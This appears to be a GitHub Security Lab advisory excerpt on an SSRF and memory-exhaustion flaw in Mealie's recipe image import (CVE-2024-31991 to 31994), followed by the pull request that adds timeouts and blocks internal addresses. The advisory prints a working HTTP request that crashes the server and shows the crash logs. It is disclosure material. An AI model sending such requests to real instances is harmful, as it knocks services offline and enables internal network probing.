Importing an image into a recipe does not have restrictions on the locations an image can be requested from, and provides a user-facing error that can be used to verify whether or not the target URL (image or otherwise) exists at the location specified. Paired with a lack of rate limiting, this permits an attacker to fully map any HTTP server on the private network that Mealie has access to. This can also be used to retrieve arbitrary files from other HTTP servers (local, or remote) and later download them to the attacker’s machine if they are able to gain administrator access to the Mealie application. Additionally, as there is no rate limiting or enforced timeout, it is possible for an attacker to cause the Mealie server to crash due to memory exhaustion by pointing it to an arbitrarily large file (e.g. a Linux ISO with a size greater than the assigned memory for the Mealie container). This also allows an attacker to maintain multiple, looping, concurrent requests to any target of their choice assuming the response is not significantly large to crash Mealie.

Unlike the [`safe_scrape_html` function](https://github.com/mealie-recipes/mealie/blob/mealie-next/mealie/services/scraper/scraper_strategies.py#L27-L70), the [`scrape_image` function](https://github.com/mealie-recipes/mealie/blob/ee121a12f8db33ecb4db5f8582f7ea9788d019e4/mealie/services/recipe/recipe_data_service.py#L107) does not have any associated timeouts, nor is the requested content chunked to reduce resource utilization.

As a result of this, an attacker can point the image request to an arbitrarily large file. Mealie will attempt to retrieve this file *in whole*. If it can be retrieved, it may be stored on the file system in whole (leading to possible disk consumption), however the more likely scenario given resource limitations is that the container will OOM during file retrieval if the target file size is greater than the allocated memory of the container. At best this can be used to force the container to infinitely restart due to OOM (if so configured in `docker-compose.yml), or at worst this can be used to force the Mealie container to crash and remain offline.

In the event that the file *can* be retrieved, the lack of rate limiting on this endpoint also permits an attacker to generate ongoing requests to any target of their choice, potentially contributing to an external-facing DoS attack.

Request an arbitrarily large file:

```
POST /api/recipes/foo/image HTTP/1.1
Host: <mealie_host>:9925
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Authorization: Bearer <token>
Content-Type: application/json
Content-Length: 114
Connection: close
Cookie: i18n_redirected=en-US; mealie.auth.strategy=local; mealie.auth._token.local=Bearer%2<token>; mealie.auth._token_expiration.local=1700837039000

{"url":"https://mirror.umd.edu/opensuse/tumbleweed/iso/openSUSE-Tumbleweed-DVD-x86_64-Snapshot20231121-Media.iso"}

```

Monitor Mealie’s container stats & logs and watch the crash and subsequent restart:

```
aa2d30ab322f   mealie                64.19%    993.3MiB / 1000MiB    99.33%    2.36GB / 12.1MB   1.81GB / 5.21GB   9
aa2d30ab322f   mealie                64.19%    993.3MiB / 1000MiB    99.33%    2.36GB / 12.1MB   1.81GB / 5.21GB   9
aa2d30ab322f   mealie                64.83%    998.2MiB / 1000MiB    99.82%    2.41GB / 12.3MB   1.81GB / 5.3GB    9
aa2d30ab322f   mealie                64.83%    998.2MiB / 1000MiB    99.82%    2.41GB / 12.3MB   1.81GB / 5.3GB    9
aa2d30ab322f   mealie                0.00%     9.445MiB / 1000MiB    0.94%     176B / 0B         22.7MB / 0B       3
aa2d30ab322f   mealie                0.00%     9.445MiB / 1000MiB    0.94%     176B / 0B         22.7MB / 0B       3
aa2d30ab322f   mealie                89.35%    14.89MiB / 1000MiB    1.49%     646B / 0B         67.2MB / 0B       3

```

```
mealie    | INFO: 22-Nov-23 07:00:16 	HTTP Request: GET https://mirror.umd.edu/opensuse/tumbleweed/iso/openSUSE-Tumbleweed-DVD-x86_64-Snapshot20231121-Media.iso "HTTP/1.1 200 OK"
mealie    | INFO:     127.0.0.1:41980 - "GET /api/app/about HTTP/1.1" 200 OK
mealie    | Killed
mealie    | INFO: 22-Nov-23 07:00:43 	Database connection established.
mealie    | INFO: 22-Nov-23 07:00:43 	Context impl SQLiteImpl.

```

Similar to requests made to `/api/recipes/create-url`, multiple requests can be performed to accelerate this impact and reduce the time to failure/increase the relevant load.

#### Impact

This issue may lead to a denial of service to Mealie, or potentially an external target.

#### Resources

* https://pypi.org/project/fastapi-limiter/
* https://pypi.org/project/slowapi/

## CVE

* CVE-2024-31991
* CVE-2024-31992
* CVE-2024-31993
* CVE-2024-31994

## Credit

These issues were discovered and reported by GHSL team member [@maclarel (Logan MacLaren)](https://github.com/maclarel).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2023-225`, `GHSL-2023-226`, `GHSL-2023-227`, or `GHSL-2023-228` in any communication regarding these issues.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information



=== Content from github.com_314f43a3_20250111_170104.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmealie-recipes%2Fmealie%2Fpull%2F3368)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmealie-recipes%2Fmealie%2Fpull%2F3368)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=mealie-recipes%2Fmealie)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mealie-recipes](/mealie-recipes)
/
**[mealie](/mealie-recipes/mealie)**
Public

* [Notifications](/login?return_to=%2Fmealie-recipes%2Fmealie) You must be signed in to change notification settings
* [Fork
  787](/login?return_to=%2Fmealie-recipes%2Fmealie)
* [Star
   7.9k](/login?return_to=%2Fmealie-recipes%2Fmealie)

* [Code](/mealie-recipes/mealie)
* [Issues
  71](/mealie-recipes/mealie/issues)
* [Pull requests
  27](/mealie-recipes/mealie/pulls)
* [Discussions](/mealie-recipes/mealie/discussions)
* [Actions](/mealie-recipes/mealie/actions)
* [Security](/mealie-recipes/mealie/security)
* [Insights](/mealie-recipes/mealie/pulse)

Additional navigation options

* [Code](/mealie-recipes/mealie)
* [Issues](/mealie-recipes/mealie/issues)
* [Pull requests](/mealie-recipes/mealie/pulls)
* [Discussions](/mealie-recipes/mealie/discussions)
* [Actions](/mealie-recipes/mealie/actions)
* [Security](/mealie-recipes/mealie/security)
* [Insights](/mealie-recipes/mealie/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fmealie-recipes%2Fmealie%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fmealie-recipes%2Fmealie%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# security: gh security recs #3368

 Merged

[hay-kot](/hay-kot)
merged 13 commits into
[mealie-next](/mealie-recipes/mealie/tree/mealie-next "mealie-recipes/mealie:mealie-next")
from
[security/gh-security-recs](/mealie-recipes/mealie/tree/security/gh-security-recs "mealie-recipes/mealie:security/gh-security-recs")

Apr 2, 2024

 Merged

# [security: gh security recs](#top) #3368

[hay-kot](/hay-kot)
merged 13 commits into
[mealie-next](/mealie-recipes/mealie/tree/mealie-next "mealie-recipes/mealie:mealie-next")
from
[security/gh-security-recs](/mealie-recipes/mealie/tree/security/gh-security-recs "mealie-recipes/mealie:security/gh-security-recs")

Apr 2, 2024

[Conversation
12](/mealie-recipes/mealie/pull/3368)
[Commits
13](/mealie-recipes/mealie/pull/3368/commits)
[Checks
10](/mealie-recipes/mealie/pull/3368/checks)
[Files changed](/mealie-recipes/mealie/pull/3368/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![hay-kot](https://avatars.githubusercontent.com/u/64056131?s=60&v=4)](/hay-kot)

Copy link

Collaborator

### @hay-kot **[hay-kot](/hay-kot)** commented [Mar 24, 2024](#issue-2204528984) • edited Loading

## What type of PR is this?

*(REQUIRED)*

* security
* bug

## What this PR does / why we need it:

Addresses several security concerns raised by external audit/review

1. All user HTTP requests now use a custom Transport class that applies a timeout and blocks known internal address spaces
2. Note that you can't simple whitelist specific IP's, you must resolve the domain name first and then check the address space of the resolved IP. This prevents attackers from creating a DNS entry that resolves to a local address space and using that url to attack a Mealie instance.

Also, note that these are mitigations, they are not 100% fixes.

## Which issue(s) this PR fixes:

* Closes [fix: Add 127.0.1.1 to exclude list #3364](https://github.com/mealie-recipes/mealie/pull/3364)

## Special notes for your reviewer:

I've tested locally and all the automated testing should pass. If possible, I would like another reviewer to pull down these changes and attempt to

1. Scrape a few recipes from different domains
2. Use the Scrape Image functionality to pull external images into Mealie from a few different domains.

## Testing

See Above

Sorry, something went wrong.

 ❤️
1
 maclarel reacted with heart emoji

All reactions

* ❤️
  1 reaction

 [![@hay-kot](https://avatars.githubusercontent.com/u/64056131?s=40&u=e9c77c8ed0c343395605b0468ca65565bc7907c0&v=4)](/hay-kot)
[hay-kot](/hay-kot)
[force-pushed](/mealie-recipes/mealie/compare/c68a95b932ca47171f851a53ddf20f9994218268..9fcb6c02a5e9deb505f17c324a417bc5a47acb39)
the
security/gh-security-recs

branch
from
[`c68a95b`](/mealie-recipes/mealie/commit/c68a95b932ca47171f851a53ddf20f9994218268) to
[`9fcb6c0`](/mealie-recipes/mealie/commit/9fcb6c02a5e9deb505f17c324a417bc5a47acb39)  [Compare](/mealie-recipes/mealie/compare/c68a95b932ca47171f851a53ddf20f9994218268..9fcb6c02a5e9deb505f17c324a417bc5a47acb39)
[March 25, 2024 15:51](#event-12236851247)

 [![@hay-kot](https://avatars.githubusercontent.com/u/64056131?s=40&u=e9c77c8ed0c343395605b0468ca65565bc7907c0&v=4)](/hay-kot)
[hay-kot](/hay-kot)
marked this pull request as ready for review
[March 25, 2024 15:56](#event-12236919983)

[![@boc-the-git](https://avatars.githubusercontent.com/u/3479092?s=40&v=4)](/boc-the-git)
[boc-the-git](/boc-the-git)
self-assigned this
[Mar 26, 2024](#event-12248013977)

[![boc-the-git](https://avatars.githubusercontent.com/u/3479092?s=60&v=4)](/boc-the-git)

**[boc-the-git](/boc-the-git)**
requested changes
[Mar 26, 2024](#pullrequestreview-1960092472)

 [View reviewed changes](/mealie-recipes/mealie/pull/3368/files)

Copy link

Collaborator

### @boc-the-git **[boc-the-git](/boc-the-git)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

The code changes all look good.

In testing the happy path, everything went well (i.e. I can still import recipes and images from legitimate internet sites.

In testing the negative path (trying to access things on my internal network), things came unstuck.

This first series of images is when accessing my Vikunja instance via the URL/reverse proxy (note I installed ping in the dev container to confirm what it's resolving to):

[![image](https://private-user-images.githubusercontent.com/3479092/316839542-2e497b5e-839d-41cc-87f0-92a182729458.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTUxNjMsIm5iZiI6MTczNjYxNDg2MywicGF0aCI6Ii8zNDc5MDkyLzMxNjgzOTU0Mi0yZTQ5N2I1ZS04MzlkLTQxY2MtODdmMC05MmExODI3Mjk0NTgucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMTcwMTAzWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9YmY0ZTFmMjk0NDA1NDk1ODJhNzllZTliM2Q5ZjJhY2UxMzNhNDQ5YWZhMWMzYWNkZjI4MWI1Mzg3NjAwNzFjYSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.86qRL_ZNFUNIBrG2g-gpvyWcevyiPYUqkbyo4bhg6gU)](https://private-user-images.githubusercontent.com/3479092/316839542-2e497b5e-839d-41cc-87f0-92a182729458.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTUxNjMsIm5iZiI6MTczNjYxNDg2MywicGF0aCI6Ii8zNDc5MDkyLzMxNjgzOTU0Mi0yZTQ5N2I1ZS04MzlkLTQxY2MtODdmMC05MmExODI3Mjk0NTgucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMTcwMTAzWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9YmY0ZTFmMjk0NDA1NDk1ODJhNzllZTliM2Q5ZjJhY2UxMzNhNDQ5YWZhMWMzYWNkZjI4MWI1Mzg3NjAwNzFjYSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.86qRL_ZNFUNIBrG2g-gpvyWcevyiPYUqkbyo4bhg6gU)

[![image](https://private-user-images.githubusercontent.com/3479092/316839848-b5e9301b-d236-4d55-a983-822cbb3b5a33.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTUxNjMsIm5iZiI6MTczNjYxNDg2MywicGF0aCI6Ii8zNDc5MDkyLzMxNjgzOTg0OC1iNWU5MzAxYi1kMjM2LTRkNTUtYTk4My04MjJjYmIzYjVhMzMucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMTcwMTAzWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9MWJiOGQyZDUzYmQzZDk3YWE2M2Q3ZDEwMWVhMjU5NzM2NTIwZGMyMWNmMWRjOGFiZTgyOTcyMWQzOGIwNGU4NCZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.XqY0qaUxiIl5nRok75sy5gpeqiM7_Dc63MNqMx-O-qM)](https://private-user-images.githubusercontent.com/3479092/316839848-b5e9301b-d236-4d55-a983-822cbb3b5a33.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTUxNjMsIm5iZiI6MTczNjYxNDg2MywicGF0aCI6Ii8zNDc5MDkyLzMxNjgzOTg0OC1iNWU5MzAxYi1kMjM2LTRkNTUtYTk4My04MjJjYmIzYjVhMzMucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMTcwMTAzWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9MWJiOGQyZDUzYmQzZDk3YWE2M2Q3ZDEwMWVhMjU5NzM2NTIwZGMyMWNmMWRjOGFiZTgyOTcyMWQzOGIwNGU4NCZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.XqY0qaUxiIl5nRok75sy5gpeqiM7_Dc63MNqMx-O-qM)

[![image](https://private-user-images.githubusercontent.com/3479092/316839893-22f64df7-383b-4aab-a517-ca2360990d49.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTUxNjMsIm5iZiI6MTczNjYxNDg2MywicGF0aCI6Ii8zNDc5MDkyLzMxNjgzOTg5My0yMmY2NGRmNy0zODNiLTRhYWItYTUxNy1jYTIzNjA5OTBkNDkucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMTcwMTAzWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9MjQwNTk5ODU5MjYyYzZlN2UwMWRmMDAzZjhhZTYwMTBjODFmNTFhMzQ1YTMzNThlMzUxOGViYmY4N2E2OWZjNSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.7p6yYiYvEKi76KAXhDyoAr_kgqPJQscwSBsE9JvdYzc)](https://private-user-images.githubusercontent.com/3479092/316839893-22f64df7-383b-4aab-a517-ca2360990d49.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTUxNjMsIm5iZiI6MTczNjYxNDg2MywicGF0aCI6Ii8zNDc5MDkyLzMxNjgzOTg5My0yMmY2NGRmNy0zODNiLTRhYWItYTUxNy1jYTIzNjA5OTBkNDkucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMTcwMTAzWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9MjQwNTk5ODU5MjYyYzZlN2UwMWRmMDAzZjhhZTYwMTBjODFmNTFhMzQ1YTMzNThlMzUxOGViYmY4N2E2OWZjNSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.7p6yYiYvEKi76KAXhDyoAr_kgqPJQscwSBsE9JvdYzc)

Then for a further test, I popped the IP/port in directly, avoiding the reverse proxy and any DNS resolution:

[![image](https://private-user-images.githubusercontent.com/3479092/316840369-ba26aa76-5c91-4819-a6b3-bcd9f6017ff3.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTUxNjMsIm5iZiI6MTczNjYxNDg2MywicGF0aCI6Ii8zNDc5MDkyLzMxNjg0MDM2OS1iYTI2YWE3Ni01YzkxLTQ4MTktYTZiMy1iY2Q5ZjYwMTdmZjMucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMTcwMTAzWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9ODRmYzQyOGJkYTM4ZDNlYmQ4ZTAxZGI3Nzk2NDViZTkwNzgxMWFlNGUzMjIwYzIzZWI0N2FkYWEwMDU3NWZhMyZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.Yc7Y4J4lUkbDBuE9EUJb5YT-wFyUA_9fvlHy_V47AXk)](https://private-user-images.githubusercontent.com/3479092/316840369-ba26aa76-5c91-4819-a6b3-bcd9f6017ff3.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTUxNjMsIm5iZiI6MTczNjYxNDg2MywicGF0aCI6Ii8zNDc5MDkyLzMxNjg0MDM2OS1iYTI2YWE3Ni01YzkxLTQ4MTktYTZiMy1iY2Q5ZjYwMTdmZjMucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMTcwMTAzWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9ODRmYzQyOGJkYTM4ZDNlYmQ4ZTAxZGI3Nzk2NDViZTkwNzgxMWFlNGUzMjIwYzIzZWI0N2FkYWEwMDU3NWZhMyZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.Yc7Y4J4lUkbDBuE9EUJb5YT-wFyUA_9fvlHy_V47AXk)

[@hay-kot](https://github.com/hay-kot) I'm interested in whether you can replicate this scenario.

I dug a bit deeper, and wanted to get some evidence of what was happening, which this code change and error message shows.. effectively the IP is `None`, rather than `192.168.x.y` as I'd expect.

[![image](https://private-user-images.githubusercontent.com/3479092/316843149-99e59e29-f27e-48d1-b24f-062a64396b18.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTUxNjMsIm5iZiI6MTczNjYxNDg2MywicGF0aCI6Ii8zNDc5MDkyLzMxNjg0MzE0OS05OWU1OWUyOS1mMjdlLTQ4ZDEtYjI0Zi0wNjJhNjQzOTZiMTgucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMTcwMTAzWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9ZTNmYmQwNzQ5ZDY1YzI0ZDg2NWExNjlkM2Y2NTk3YWE3ZjgwZmM0ZTMyYzMxZWQzOTk5MGIyODQ3NDUzN2MwZiZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.GvoEQAlv7IYboO2KBmJ_9SkbP9o5prpN-si-tj7H0tI)](https://private-user-images.githubusercontent.com/3479092/316843149-99e59e29-f27e-48d1-b24f-062a64396b18.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTUxNjMsIm5iZiI6MTczNjYxNDg2MywicGF0aCI6Ii8zNDc5MDkyLzMxNjg0MzE0OS05OWU1OWUyOS1mMjdlLTQ4ZDEtYjI0Zi0wNjJhNjQzOTZiMTgucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMTcwMTAzWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9ZTNmYmQwNzQ5ZDY1YzI0ZDg2NWExNjlkM2Y2NTk3YWE3ZjgwZmM0ZTMyYzMxZWQzOTk5MGIyODQ3NDUzN2MwZiZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.GvoEQAlv7IYboO2KBmJ_9SkbP9o5prpN-si-tj7H0tI)

Sorry, something went wrong.

All reactions

[![@p0lycarpio](https://avatars.githubusercontent.com/u/66876397?s=80&u=45c8e63dc7ff1c2022442f0d8ef314d43a0a68a1&v=4)](/p0lycarpio)

Copy link

Contributor

### **[p0lycarpio](/p0lycarpio)** commented [Mar 28, 2024](#issuecomment-2024924163)

| Along the same lines as the `ALLOW_SIGNUP` variable which was set to `False`, I suggest setting all groups to private by default when they are created. This is an additional security measure and also when using Mealie for the first time the user would be redirected to the login/welcome page instead of the empty group. What is your opinion ?  The change would be made in the [group\_preferences.py](https://github.com/mealie-recipes/mealie/blob/7f596c653bdeaaee64efd5c6ec5f5f0a3108c2f4/mealie/schema/group/group_preferences.py#L9) schema. I don't know the impacts though. |
| --- |

All reactions

Sorry, something went wrong.

